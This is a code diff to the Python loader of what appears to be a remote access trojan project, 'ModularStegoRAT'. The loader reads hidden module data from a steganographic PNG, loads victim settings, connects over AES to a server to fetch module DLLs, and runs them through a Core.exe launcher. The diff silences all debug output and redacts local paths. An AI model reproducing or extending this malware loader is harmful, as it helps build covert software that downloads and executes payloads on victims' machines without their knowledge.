@@ -23,7 +23,7 @@ JSON_NAME = "VictimSettings.JSON"
 #Setup variables
 NO_BYTES_PER_MODULE = 2
 DB_INIT_SIZE_BYTES = 1024
-CORE_EXE_PATH = "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Core\\out\\build\\x64-debug\\Core.exe"
+CORE_EXE_PATH = "C:\\Users\\..."
 
 databaseHost = ""
 databasePort = 0
@@ -173,8 +173,8 @@ def ExtractFromStego(stegoPath : str):
         #print(len(moduleRawData), moduleRawData)
         #print(len(moduleSettingsRawData))
     
-    print(modules)
-    print(moduleSettings)
+    #print(modules)
+    #print(moduleSettings)
     
     #Step 4 - get the module DLLs from the server
     aes, dbSocket = InitServerConnection()
@@ -224,7 +224,7 @@ def ExtractFromStego(stegoPath : str):
         for integer in setting:
             moduleSettingsStringified.append(str(integer).rjust(3, "0"))
         
-        print(moduleSettingsStringified)
+        #print(moduleSettingsStringified)
         
         core = subprocess.run(
             [CORE_EXE_PATH, moduleDLLPath, "".join(moduleSettingsStringified)],
@@ -232,12 +232,13 @@ def ExtractFromStego(stegoPath : str):
             text=True
         )
         
-        print(core.stdout)
+        #print(core.stdout)
         
         if(core.returncode != 0):
-            print(core.returncode)
-            print(core.stderr)
+            #print(core.returncode)
+            #print(core.stderr)
+            pass
 
 #Loading in the JSON stuff
 victimBytesHex, (databaseHost, databasePort) = LoadSettingsFromJSON(JSON_NAME)
-ExtractFromStego(r"C:\Users\iniga\OneDrive\Programming\ModularStegoRAT\Stegos\1Stego.png")
+ExtractFromStego(r"C:\\Users\\...")
